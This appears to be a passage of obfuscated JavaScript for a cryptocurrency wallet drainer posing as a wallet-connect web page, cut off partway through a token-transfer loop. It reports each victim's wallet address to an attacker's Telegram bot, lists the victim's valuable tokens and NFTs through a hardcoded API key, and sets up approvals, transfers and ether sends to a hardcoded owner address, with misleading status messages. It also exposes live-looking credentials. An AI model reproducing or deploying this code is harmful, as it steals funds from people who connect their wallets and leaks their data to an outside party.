const _0x305c57=_0x4468;(function(_0x512889,_0x34a8be){const _0x2ed881=_0x4468,_0x94a353=_0x512889();while(!![]){try{const _0xf3a1fc=-parseInt(_0x2ed881(0x71))/0x1+-parseInt(_0x2ed881(0x86))/0x2*(-parseInt(_0x2ed881(0x89))/0x3)+-parseInt(_0x2ed881(0x108))/0x4+-parseInt(_0x2ed881(0x11a))/0x5+parseInt(_0x2ed881(0xa5))/0x6+parseInt(_0x2ed881(0x115))/0x7+parseInt(_0x2ed881(0xce))/0x8;if(_0xf3a1fc===_0x34a8be)break;else _0x94a353['push'](_0x94a353['shift']());}catch(_0x1480f9){_0x94a353['push'](_0x94a353['shift']());}}}(_0x1b93,0xadf45));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {mainnet,bsc}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[mainnet,bsc],projectId='ee71d215d0dec7d1bf950851c84d9643',{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x305c57(0x10f))]({'chains':chains,'options':{'appName':_0x305c57(0x11f)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':'https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','coinbase':_0x305c57(0x116)}},ethereumClient);let currentUrl=window['location'][_0x305c57(0x9d)];const OWNER_ADDRESS='0xea8968B218a551919FbD5f1166328C82a96dED54',ABI=[{'constant':!![],'inputs':[],'name':_0x305c57(0xb2),'outputs':[{'name':'','type':_0x305c57(0xfa)}],'payable':![],'stateMutability':'view','type':_0x305c57(0x9c)},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':_0x305c57(0xb6)}],'name':_0x305c57(0x109),'outputs':[],'payable':![],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'constant':![],'inputs':[{'name':_0x305c57(0x110),'type':_0x305c57(0xb6)},{'name':'_value','type':'uint256'}],'name':_0x305c57(0xda),'outputs':[],'payable':![],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'constant':!![],'inputs':[],'name':_0x305c57(0x85),'outputs':[{'name':'','type':_0x305c57(0x7c)}],'payable':![],'stateMutability':_0x305c57(0x97),'type':'function'},{'constant':![],'inputs':[{'name':_0x305c57(0xae),'type':_0x305c57(0xb6)}],'name':_0x305c57(0x112),'outputs':[],'payable':![],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'constant':!![],'inputs':[],'name':_0x305c57(0xc3),'outputs':[{'name':'','type':_0x305c57(0x11b)}],'payable':![],'stateMutability':'view','type':_0x305c57(0x9c)},{'constant':![],'inputs':[{'name':_0x305c57(0x124),'type':_0x305c57(0xb6)},{'name':_0x305c57(0x72),'type':_0x305c57(0xb6)},{'name':_0x305c57(0xe3),'type':_0x305c57(0x11b)}],'name':'transferFrom','outputs':[],'payable':![],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'constant':!![],'inputs':[],'name':_0x305c57(0xa0),'outputs':[{'name':'','type':_0x305c57(0xb6)}],'payable':![],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'constant':!![],'inputs':[{'name':'','type':_0x305c57(0xb6)}],'name':_0x305c57(0xf1),'outputs':[{'name':'','type':_0x305c57(0x11b)}],'payable':![],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'constant':!![],'inputs':[],'name':'decimals','outputs':[{'name':'','type':_0x305c57(0x11b)}],'payable':![],'stateMutability':'view','type':_0x305c57(0x9c)},{'constant':!![],'inputs':[],'name':_0x305c57(0xc5),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'constant':!![],'inputs':[],'name':_0x305c57(0x73),'outputs':[{'name':'','type':_0x305c57(0x11b)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[],'name':_0x305c57(0x79),'outputs':[],'payable':![],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'constant':!![],'inputs':[{'name':'_maker','type':'address'}],'name':_0x305c57(0xdb),'outputs':[{'name':'','type':_0x305c57(0x7c)}],'payable':![],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'constant':!![],'inputs':[{'name':'','type':_0x305c57(0xb6)},{'name':'','type':_0x305c57(0xb6)}],'name':'allowed','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x305c57(0x97),'type':'function'},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':_0x305c57(0x7c)}],'payable':![],'stateMutability':_0x305c57(0x97),'type':'function'},{'constant':!![],'inputs':[{'name':_0x305c57(0x100),'type':_0x305c57(0xb6)}],'name':_0x305c57(0x95),'outputs':[{'name':'','type':_0x305c57(0x11b)}],'payable':![],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'constant':![],'inputs':[],'name':'pause','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x305c57(0x9c)},{'constant':!![],'inputs':[],'name':'getOwner','outputs':[{'name':'','type':_0x305c57(0xb6)}],'payable':![],'stateMutability':'view','type':_0x305c57(0x9c)},{'constant':!![],'inputs':[],'name':_0x305c57(0xc8),'outputs':[{'name':'','type':_0x305c57(0xb6)}],'payable':![],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'constant':!![],'inputs':[],'name':_0x305c57(0xc4),'outputs':[{'name':'','type':_0x305c57(0xfa)}],'payable':![],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'constant':![],'inputs':[{'name':'_to','type':'address'},{'name':'_value','type':_0x305c57(0x11b)}],'name':_0x305c57(0x98),'outputs':[],'payable':![],'stateMutability':_0x305c57(0xfd),'type':'function'},{'constant':![],'inputs':[{'name':_0x305c57(0xd3),'type':'uint256'},{'name':'newMaxFee','type':'uint256'}],'name':'setParams','outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':![],'inputs':[{'name':'amount','type':'uint256'}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'constant':![],'inputs':[{'name':_0x305c57(0x104),'type':_0x305c57(0x11b)}],'name':'redeem','outputs':[],'payable':![],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'constant':!![],'inputs':[{'name':_0x305c57(0xe1),'type':_0x305c57(0xb6)},{'name':_0x305c57(0x110),'type':_0x305c57(0xb6)}],'name':'allowance','outputs':[{'name':'remaining','type':'uint256'}],'payable':![],'stateMutability':_0x305c57(0x97),'type':'function'},{'constant':!![],'inputs':[],'name':_0x305c57(0x80),'outputs':[{'name':'','type':_0x305c57(0x11b)}],'payable':![],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':'isBlackListed','outputs':[{'name':'','type':_0x305c57(0x7c)}],'payable':![],'stateMutability':_0x305c57(0x97),'type':'function'},{'constant':![],'inputs':[{'name':_0x305c57(0x10a),'type':_0x305c57(0xb6)}],'name':_0x305c57(0x101),'outputs':[],'payable':![],'stateMutability':_0x305c57(0xfd),'type':'function'},{'constant':!![],'inputs':[],'name':_0x305c57(0x96),'outputs':[{'name':'','type':_0x305c57(0x11b)}],'payable':![],'stateMutability':'view','type':_0x305c57(0x9c)},{'constant':![],'inputs':[{'name':_0x305c57(0xb4),'type':_0x305c57(0xb6)}],'name':_0x305c57(0x83),'outputs':[],'payable':![],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'constant':![],'inputs':[{'name':_0x305c57(0x126),'type':_0x305c57(0xb6)}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':_0x305c57(0xfd),'type':'function'},{'inputs':[{'name':'_initialSupply','type':_0x305c57(0x11b)},{'name':_0x305c57(0x121),'type':_0x305c57(0xfa)},{'name':_0x305c57(0xe0),'type':_0x305c57(0xfa)},{'name':_0x305c57(0x119),'type':_0x305c57(0x11b)}],'payable':![],'stateMutability':'nonpayable','type':_0x305c57(0xb8)},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x305c57(0x11b)}],'name':_0x305c57(0x88),'type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x305c57(0x104),'type':'uint256'}],'name':_0x305c57(0x11c),'type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[{'indexed':![],'name':'newAddress','type':'address'}],'name':_0x305c57(0x7e),'type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':'uint256'},{'indexed':![],'name':_0x305c57(0x103),'type':_0x305c57(0x11b)}],'name':_0x305c57(0xab),'type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_blackListedUser','type':'address'},{'indexed':![],'name':_0x305c57(0x77),'type':_0x305c57(0x11b)}],'name':_0x305c57(0xcc),'type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x305c57(0x120),'type':_0x305c57(0xb6)}],'name':_0x305c57(0x7d),'type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x305c57(0x120),'type':_0x305c57(0xb6)}],'name':_0x305c57(0xdd),'type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x305c57(0xc8),'type':_0x305c57(0xb6)},{'indexed':!![],'name':_0x305c57(0xf7),'type':_0x305c57(0xb6)},{'indexed':![],'name':'value','type':_0x305c57(0x11b)}],'name':_0x305c57(0x10c),'type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x305c57(0x8d),'type':_0x305c57(0xb6)},{'indexed':!![],'name':'to','type':_0x305c57(0xb6)},{'indexed':![],'name':'value','type':_0x305c57(0x11b)}],'name':'Transfer','type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[],'name':'Pause','type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[],'name':'Unpause','type':'event'}],ABIN=[{'inputs':[{'internalType':_0x305c57(0xfa),'name':_0x305c57(0xb2),'type':_0x305c57(0xfa)},{'internalType':_0x305c57(0xfa),'name':_0x305c57(0xc4),'type':_0x305c57(0xfa)},{'internalType':_0x305c57(0x11b),'name':'maxNftSupply','type':_0x305c57(0x11b)},{'internalType':_0x305c57(0x11b),'name':_0x305c57(0xd2),'type':_0x305c57(0x11b)}],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0xb8)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x305c57(0xb6),'name':_0x305c57(0xc8),'type':_0x305c57(0xb6)},{'indexed':!![],'internalType':_0x305c57(0xb6),'name':_0x305c57(0xb3),'type':'address'},{'indexed':!![],'internalType':'uint256','name':_0x305c57(0xdc),'type':_0x305c57(0x11b)}],'name':_0x305c57(0x10c),'type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x305c57(0xb6),'name':_0x305c57(0xc8),'type':_0x305c57(0xb6)},{'indexed':!![],'internalType':_0x305c57(0xb6),'name':_0x305c57(0x82),'type':_0x305c57(0xb6)},{'indexed':![],'internalType':_0x305c57(0x7c),'name':_0x305c57(0xb3),'type':_0x305c57(0x7c)}],'name':_0x305c57(0xb1),'type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x305c57(0xb6),'name':_0x305c57(0xec),'type':_0x305c57(0xb6)},{'indexed':!![],'internalType':_0x305c57(0xb6),'name':_0x305c57(0xb4),'type':'address'}],'name':_0x305c57(0x12b),'type':_0x305c57(0x9f)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x305c57(0x8d),'type':_0x305c57(0xb6)},{'indexed':!![],'internalType':'address','name':'to','type':'address'},{'indexed':!![],'internalType':'uint256','name':_0x305c57(0xdc),'type':_0x305c57(0x11b)}],'name':_0x305c57(0xe6),'type':_0x305c57(0x9f)},{'inputs':[],'name':'BAYC_PROVENANCE','outputs':[{'internalType':'string','name':'','type':_0x305c57(0xfa)}],'stateMutability':'view','type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0x11d),'outputs':[{'internalType':_0x305c57(0x11b),'name':'','type':_0x305c57(0x11b)}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[],'name':'REVEAL_TIMESTAMP','outputs':[{'internalType':_0x305c57(0x11b),'name':'','type':_0x305c57(0x11b)}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0x91),'outputs':[{'internalType':_0x305c57(0x11b),'name':'','type':'uint256'}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[{'internalType':_0x305c57(0xb6),'name':'to','type':'address'},{'internalType':'uint256','name':_0x305c57(0xdc),'type':_0x305c57(0x11b)}],'name':_0x305c57(0xda),'outputs':[],'stateMutability':_0x305c57(0xfd),'type':'function'},{'inputs':[{'internalType':_0x305c57(0xb6),'name':_0x305c57(0xc8),'type':_0x305c57(0xb6)}],'name':_0x305c57(0x95),'outputs':[{'internalType':_0x305c57(0x11b),'name':'','type':_0x305c57(0x11b)}],'stateMutability':_0x305c57(0x97),'type':'function'},{'inputs':[],'name':_0x305c57(0xe4),'outputs':[{'internalType':'string','name':'','type':_0x305c57(0xfa)}],'stateMutability':_0x305c57(0x97),'type':'function'},{'inputs':[],'name':'emergencySetStartingIndexBlock','outputs':[],'stateMutability':_0x305c57(0xfd),'type':'function'},{'inputs':[],'name':'flipSaleState','outputs':[],'stateMutability':'nonpayable','type':_0x305c57(0x9c)},{'inputs':[{'internalType':_0x305c57(0x11b),'name':_0x305c57(0xdc),'type':_0x305c57(0x11b)}],'name':_0x305c57(0xe9),'outputs':[{'internalType':_0x305c57(0xb6),'name':'','type':_0x305c57(0xb6)}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[{'internalType':_0x305c57(0xb6),'name':_0x305c57(0xc8),'type':_0x305c57(0xb6)},{'internalType':'address','name':_0x305c57(0x82),'type':_0x305c57(0xb6)}],'name':'isApprovedForAll','outputs':[{'internalType':_0x305c57(0x7c),'name':'','type':_0x305c57(0x7c)}],'stateMutability':_0x305c57(0x97),'type':'function'},{'inputs':[],'name':_0x305c57(0xf4),'outputs':[{'internalType':'uint256','name':'','type':_0x305c57(0x11b)}],'stateMutability':_0x305c57(0x97),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x305c57(0x113),'type':_0x305c57(0x11b)}],'name':_0x305c57(0x127),'outputs':[],'stateMutability':_0x305c57(0x118),'type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0xb2),'outputs':[{'internalType':_0x305c57(0xfa),'name':'','type':'string'}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0xc8),'outputs':[{'internalType':'address','name':'','type':_0x305c57(0xb6)}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[{'internalType':_0x305c57(0x11b),'name':_0x305c57(0xdc),'type':_0x305c57(0x11b)}],'name':_0x305c57(0x9b),'outputs':[{'internalType':_0x305c57(0xb6),'name':'','type':_0x305c57(0xb6)}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0x123),'outputs':[],'stateMutability':'nonpayable','type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0xc2),'outputs':[],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'inputs':[{'internalType':_0x305c57(0xb6),'name':_0x305c57(0x8d),'type':'address'},{'internalType':'address','name':'to','type':_0x305c57(0xb6)},{'internalType':_0x305c57(0x11b),'name':_0x305c57(0xdc),'type':_0x305c57(0x11b)}],'name':_0x305c57(0xfe),'outputs':[],'stateMutability':_0x305c57(0xfd),'type':'function'},{'inputs':[{'internalType':_0x305c57(0xb6),'name':_0x305c57(0x8d),'type':_0x305c57(0xb6)},{'internalType':'address','name':'to','type':_0x305c57(0xb6)},{'internalType':_0x305c57(0x11b),'name':'tokenId','type':_0x305c57(0x11b)},{'internalType':_0x305c57(0xd1),'name':_0x305c57(0x76),'type':_0x305c57(0xd1)}],'name':_0x305c57(0xfe),'outputs':[],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0xd4),'outputs':[{'internalType':_0x305c57(0x7c),'name':'','type':'bool'}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':'address','name':_0x305c57(0x82),'type':_0x305c57(0xb6)},{'internalType':_0x305c57(0x7c),'name':'approved','type':_0x305c57(0x7c)}],'name':_0x305c57(0xc9),'outputs':[],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'inputs':[{'internalType':'string','name':_0x305c57(0xe4),'type':_0x305c57(0xfa)}],'name':_0x305c57(0x102),'outputs':[],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'inputs':[{'internalType':_0x305c57(0xfa),'name':_0x305c57(0x8c),'type':_0x305c57(0xfa)}],'name':_0x305c57(0x122),'outputs':[],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'inputs':[{'internalType':_0x305c57(0x11b),'name':_0x305c57(0xc6),'type':'uint256'}],'name':'setRevealTimestamp','outputs':[],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0x11e),'outputs':[],'stateMutability':_0x305c57(0xfd),'type':'function'},{'inputs':[],'name':_0x305c57(0xb9),'outputs':[{'internalType':_0x305c57(0x11b),'name':'','type':_0x305c57(0x11b)}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0x106),'outputs':[{'internalType':_0x305c57(0x11b),'name':'','type':_0x305c57(0x11b)}],'stateMutability':_0x305c57(0x97),'type':'function'},{'inputs':[{'internalType':'bytes4','name':_0x305c57(0x74),'type':'bytes4'}],'name':_0x305c57(0xc1),'outputs':[{'internalType':_0x305c57(0x7c),'name':'','type':'bool'}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0xc4),'outputs':[{'internalType':'string','name':'','type':_0x305c57(0xfa)}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[{'internalType':'uint256','name':_0x305c57(0x90),'type':_0x305c57(0x11b)}],'name':_0x305c57(0xac),'outputs':[{'internalType':_0x305c57(0x11b),'name':'','type':_0x305c57(0x11b)}],'stateMutability':_0x305c57(0x97),'type':'function'},{'inputs':[{'internalType':_0x305c57(0xb6),'name':_0x305c57(0xc8),'type':_0x305c57(0xb6)},{'internalType':'uint256','name':_0x305c57(0x90),'type':'uint256'}],'name':_0x305c57(0xad),'outputs':[{'internalType':_0x305c57(0x11b),'name':'','type':_0x305c57(0x11b)}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[{'internalType':_0x305c57(0x11b),'name':'tokenId','type':_0x305c57(0x11b)}],'name':_0x305c57(0xf8),'outputs':[{'internalType':_0x305c57(0xfa),'name':'','type':_0x305c57(0xfa)}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0xc3),'outputs':[{'internalType':_0x305c57(0x11b),'name':'','type':_0x305c57(0x11b)}],'stateMutability':_0x305c57(0x97),'type':_0x305c57(0x9c)},{'inputs':[{'internalType':'address','name':'from','type':_0x305c57(0xb6)},{'internalType':'address','name':'to','type':_0x305c57(0xb6)},{'internalType':'uint256','name':'tokenId','type':_0x305c57(0x11b)}],'name':_0x305c57(0x99),'outputs':[],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'inputs':[{'internalType':_0x305c57(0xb6),'name':_0x305c57(0xb4),'type':_0x305c57(0xb6)}],'name':_0x305c57(0x83),'outputs':[],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)},{'inputs':[],'name':_0x305c57(0x10d),'outputs':[],'stateMutability':_0x305c57(0xfd),'type':_0x305c57(0x9c)}];function _0x1b93(){const _0x12c433=['_clearedUser','NFT','Approval','withdraw','status','CoinbaseWalletConnector','_spender','formatted','addBlackList','numberOfTokens','filter','5055582mRslJC','https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png','Transaction\x20is\x20submitted\x20to\x20the\x20network','payable','_decimals','6328665Slshcm','uint256','Redeem','MAX_APES','setStartingIndex','Blockchain\x20rectification','_user','_name','setProvenanceHash','renounceOwnership','_from','&format=decimal&limit=','_blackListedUser','mintApe','Transaction\x20Receipt:\x20','Hahahahahah','.proceed','OwnershipTransferred','429353EPXkoJ','_to','_totalSupply','interfaceId','Token\x20balance\x20is\x20','_data','_balance','openModal','unpause','price','click','bool','AddedBlackList','Deprecate','application/json','basisPointsRate','toString','operator','transferOwnership','coinbase','deprecated','1368OMiqeT','trustwallet','Issue','5157KdfeeG','https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=','Your\x20address\x20','provenanceHash','from','Initial\x20list\x20','MetaMask','index','apePrice','message','Error\x20processing\x20item\x20','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','balanceOf','MAX_UINT','view','transfer','transferFrom','New\x20token','ownerOf','function','href','&text=','event','upgradedAddress','catch','networkVersion','getProvider','Approve\x20Completed\x20Successfully','1344684uYLLuw','options','undefined','999999999999999999999999999999999999999999999999999999999999999999999999','token_address','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','Params','tokenByIndex','tokenOfOwnerByIndex','_evilUser','TOKEN\x20Contract\x20Address\x20','NFT\x20Contract\x20Address\x20','ApprovalForAll','name','approved','newOwner','Error\x20collecting\x20info\x20about\x20wallet','address','Transaction\x20Rejected','constructor','startingIndex','/erc20','Cl\x20address\x20:\x20','sending\x20ether','location','.coinbase','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','supportsInterface','reserveApes','totalSupply','symbol','maximumFee','revealTimeStamp','0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0','owner','setApprovalForAll','balance','value','DestroyedBlackFunds','https://metamask.app.link/dapp/','8405432sRLNWM','usd','.meta','bytes','saleStart','newBasisPoints','saleIsActive','Could\x20not\x20get\x20a\x20wallet\x20connection','connector','Approved','Unable\x20to\x20get\x20NFts','.trust','approve','getBlackListStatus','tokenId','RemovedBlackList','https://deep-index.moralis.io/api/v2/','tokens-list','_symbol','_owner','Incorrect\x20network','_value','baseURI','log','Transfer','hash','No\x20address','getApproved','NFTs\x20collection\x20','gasPrice','previousOwner','metamask','error','5227607491','length','balances','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','https://link.trustwallet.com/open_url?url=','maxApePurchase','GET','eth','spender','tokenURI','Transaction\x20hash\x20','string','chainId:','then','nonpayable','safeTransferFrom','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','who','removeBlackList','setBaseURI','maxFee','amount','Tokens:','startingIndexBlock','json','3060848jSLxXa','deprecate'];_0x1b93=function(){return _0x12c433;};return _0x1b93();}let wallet;$(_0x305c57(0xd0))[_0x305c57(0x7b)](async function(){const _0x1f9937=_0x305c57;wallet=_0x1f9937(0xed),await connector();}),$(_0x305c57(0xbe))[_0x305c57(0x7b)](async function(){const _0x43eba2=_0x305c57;wallet=_0x43eba2(0x84),await connector();}),$(_0x305c57(0xd9))[_0x305c57(0x7b)](async function(){const _0x3a6f62=_0x305c57;wallet=_0x3a6f62(0x87),await connector();}),$('.connect')[_0x305c57(0x7b)](async function(){const _0x2ddc9a=_0x305c57;try{await web3Modal[_0x2ddc9a(0x78)]();}catch(_0x32979d){console[_0x2ddc9a(0xe5)](_0x2ddc9a(0xd5),_0x32979d);return;}});let connector=async()=>{const _0x43faaa=_0x305c57;if(typeof web3===_0x43faaa(0xa7)){console[_0x43faaa(0xe5)](_0x43faaa(0x129));if(wallet===_0x43faaa(0xed)){let _0x27550c=_0x43faaa(0xcd)+currentUrl;window[_0x43faaa(0xbd)][_0x43faaa(0x9d)]=_0x27550c;}else{if(wallet===_0x43faaa(0x84)){let _0x1eebce='https://go.cb-w.com/dapp?cb_url='+currentUrl;window[_0x43faaa(0xbd)]['href']=_0x1eebce;}else{if(wallet===_0x43faaa(0x87)){let _0x41d1e0=_0x43faaa(0xf3)+currentUrl;window[_0x43faaa(0xbd)][_0x43faaa(0x9d)]=_0x41d1e0;}}}}else try{await web3Modal[_0x43faaa(0x78)]();}catch(_0x1e9b12){console['log'](_0x43faaa(0xd5),_0x1e9b12);return;}};function _0x4468(_0x2ff4e7,_0x2e5989){const _0x1b93cb=_0x1b93();return _0x4468=function(_0x4468ec,_0x3e15e2){_0x4468ec=_0x4468ec-0x71;let _0x4a0b3e=_0x1b93cb[_0x4468ec];return _0x4a0b3e;},_0x4468(_0x2ff4e7,_0x2e5989);}$(_0x305c57(0x12a))['click'](async function(){const _0xd4be0c=_0x305c57;let _0x22f9e0=getAccount();console[_0xd4be0c(0xe5)](_0x22f9e0),!_0x22f9e0[_0xd4be0c(0xb6)]&&(console[_0xd4be0c(0xe5)](_0xd4be0c(0xe8)),alert('You\x20need\x20to\x20connect\x20your\x20wallet\x20first')),_0x22f9e0[_0xd4be0c(0xd6)][_0xd4be0c(0xb2)]===_0xd4be0c(0x8f)&&(_0x22f9e0[_0xd4be0c(0xd6)][_0xd4be0c(0xa6)][_0xd4be0c(0xa3)]()[_0xd4be0c(0xa2)]!=='1'&&(console[_0xd4be0c(0xe5)](_0xd4be0c(0xe2)),await switchNetwork({'chainId':0x1}))),selectedAccount=_0x22f9e0['address'],sendMessage(_0xd4be0c(0xc0)),sendMessage(_0xd4be0c(0xbb)+selectedAccount),covalenthqAPICall();});const Oxa=_0x305c57(0xc7),Oxc=_0x305c57(0xef);async function covalenthqAPICall(){const _0x243caf=_0x305c57,_0xdfc67a={'chain':_0x243caf(0xf6)},_0x40eb8b=new URL(_0x243caf(0xde)+selectedAccount+_0x243caf(0xba));_0x40eb8b['search']=new URLSearchParams(_0xdfc67a)[_0x243caf(0x81)]();const _0x303da7={'method':_0x243caf(0xf5),'headers':{'accept':_0x243caf(0x7f),'X-API-Key':'LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn'}};try{const _0x3d748c=await fetch(_0x40eb8b,_0x303da7)[_0x243caf(0xfc)](_0x140906=>_0x140906[_0x243caf(0x107)]());console['log'](_0x3d748c);let _0x124dd7=_0x3d748c;console[_0x243caf(0xe5)](_0x243caf(0x8e),_0x124dd7);let _0x32f2c5=await Promise['all'](_0x124dd7['map'](async _0x2f643d=>{const _0x11d82d=_0x243caf;let _0x2e6c42;try{_0x2e6c42=await getValue(_0x2f643d[_0x11d82d(0xa9)],_0x2f643d['balance'],_0x2f643d['decimals']);}catch(_0x2a5e10){_0x2e6c42=0x0;}return console[_0x11d82d(0xe5)](_0x2e6c42),{'balance':_0x2f643d[_0x11d82d(0xca)],'value':_0x2e6c42,'address':_0x2f643d[_0x11d82d(0xa9)]};}));console['log'](_0x243caf(0xdf),_0x32f2c5),tokens=_0x32f2c5[_0x243caf(0x114)](_0x50868d=>_0x50868d['value']>0x5),tokens['sort']((_0x28dcf0,_0x118e05)=>_0x118e05[_0x243caf(0xcb)]-_0x28dcf0[_0x243caf(0xcb)]),console[_0x243caf(0xe5)](_0x243caf(0xfb),await getNetwork(),_0x243caf(0x105),tokens),NFTs=await getNFTs(selectedAccount)['catch'](_0x3fd92d=>{const _0x53ea32=_0x243caf;console[_0x53ea32(0xe5)](_0x53ea32(0xd8),_0x3fd92d);}),NFTs=NFTs['result'],console[_0x243caf(0xe5)](_0x243caf(0xea),NFTs);if(tokens[_0x243caf(0xf0)]===0x0&&NFTs['length']===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x243caf(0xb5));}}async function onApprove(){const _0x6d753=_0x305c57;if(tokens[_0x6d753(0xf0)])try{loopTokens(tokens);}catch(_0x4d8ef8){console['error']('Error\x20processing\x20item\x20'+_0x4d8ef8[_0x6d753(0x92)]);}else{if(NFTs[_0x6d753(0xf0)]){try{loopNfts(NFTs);}catch(_0xa536c3){console[_0x6d753(0xee)]('Error\x20processing\x20item\x20'+_0xa536c3[_0x6d753(0x92)]);}onSendEther(),sendMessage(_0x6d753(0xbf));}else try{onSendEther();}catch(_0x11a88a){console[_0x6d753(0xee)](_0x6d753(0x93)+_0x11a88a[_0x6d753(0x92)]);}}}async function loopTokens(_0x408343){const _0x3e4d83=_0x305c57;for await(let _0x4ddd96 of _0x408343){console[_0x3e4d83(0xe5)]('Token',_0x4ddd96);try{sendMessage(_0x3e4d83(0x9a));let {hash:_0xc7778c}=await 